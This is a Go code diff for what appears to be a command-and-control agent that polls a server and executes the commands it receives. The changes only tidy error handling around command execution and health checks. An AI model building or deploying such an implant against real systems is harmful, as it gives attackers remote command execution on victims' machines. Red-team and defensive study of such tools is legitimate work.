@@ -125,8 +125,7 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 				return nil
 			}
 		}
-		runCommand(PacketBuffersWithSignature[int(command.Msg.ParentPartID)])
-		return nil // todo
+		return runCommand(PacketBuffersWithSignature[int(command.Msg.ParentPartID)])
 
 	case c2.MessageExecuteCommandRes:
 		if command.Msg.IsLastPart || command.Msg.ParentPartID == 0 {
@@ -171,11 +170,10 @@ func SendQuestionToServer(Q string) error {
 		if err != nil {
 			return fmt.Errorf("error in decrypting incoming packet from server: %s", err)
 		}
-		handleServerCommand(msgList)
+		return handleServerCommand(msgList)
 	} else {
 		return fmt.Errorf("query is too big %d, can't send this", len(Q))
 	}
-	return nil
 }
 
 func sendHealthCheck() error {
@@ -231,7 +229,9 @@ func RunAgent(cmd *cobra.Command, args []string) error {
 	errorHandler(err)
 
 	// start the agent by sending a healthcheck
-	sendHealthCheck()
+	if err := sendHealthCheck(); err != nil {
+		log.Warnln(err)
+	}
 
 	for {
 		select {
@@ -240,7 +240,9 @@ func RunAgent(cmd *cobra.Command, args []string) error {
 			return nil
 		case <-AgentStatus.MessageTicker.C:
 			if AgentStatus.NextMessageType == c2.MessageHealthcheck {
-				sendHealthCheck()
+				if err := sendHealthCheck(); err != nil {
+					log.Warnln(err)
+				}
 			}
 			if AgentStatus.NextMessageType == c2.MessageExecuteCommandRes {
 				msg := c2.MessagePacket{
